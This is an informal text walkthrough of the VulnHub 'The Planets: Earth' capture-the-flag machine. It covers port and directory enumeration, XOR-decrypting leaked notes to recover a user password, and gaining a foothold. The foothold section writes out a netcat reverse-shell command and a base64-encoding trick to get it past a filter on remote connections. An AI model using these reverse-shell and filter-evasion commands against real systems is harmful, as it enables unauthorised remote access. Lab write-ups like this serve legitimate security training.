Link: [The Planets: Earth](https://www.vulnhub.com/entry/the-planets-earth,755/)

[Walkthrough (Video) by Techno Science](https://youtu.be/e9de7AK0i2s):
Walkthrough (Text): 

## Enumeration
Interface name: `ifconfig`

Get target IP: `sudo netdiscover -i eth1` - Interface name

Network Scan for Open Ports: `nmap -sV -sC -v -T4 192.168.56.103 `
No. of open ports: 3 
2 Host names

`sudo nano /etc/hosts`
Paste host name with IP address
`192.168.56.193 earth.local terratest.earth.local`
CTRL+X+ENTER  

Open browser
`earth.local`

Directory Busting - GoBuster
`gobuster dir -u https://earth.local/ -w /usr/share/wordlist/dirb/common.txt` - `-u` is for target URL, `-w` is to specify word list
- Found admin page 
earth.local/admin -> Login 
- Find credentials 
- Second DNS: Test site, give credentials
https://terratest.earth.local -> Accept risk
- Brute force directory using GoBuster
`gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlist/dirb/common.txt`
- robots.txt
  - testingnotes.txt -> XOR encryption as algorithm
 
 ## Decrypting:
 - Cyberchef download on google, save file
 ![image](https://user-images.githubusercontent.com/80029462/235673037-efdf02fe-ab4d-4a44-aff9-608f59213e31.png)
Use Wired Connection 1 if server error
- After download change back to usual connection
- Extract file, click on HTNL
- Open test data, decrypt them to XOR, drag drop hex and XOR.
- Key: update from testdata.txt, set to UTF8
- Copy and paste one by one
  - Get repeating string = Password for user 'terra'


## Foothold
Login with password
CLI command line interface 
`whoami`
- Find user flag: `ls /var/earth_web/user_flag.txt`
Command line: (Flag)

In terminal:
`ifconfig` to get machine IP
`nc -lvnp 4444` - listening port 

Remote command line shell using Netcat:
`nc -e /bin/bash machine IP (from above) 4444`

Remove connections are forbidden
- bypass by converting it to decimal notation / encode command in base64

In terminal:
`echo nc -e /bin/bash machine IP (from above) 4444 | base64`
- Copy output and run with `output | base64 -d | bash`
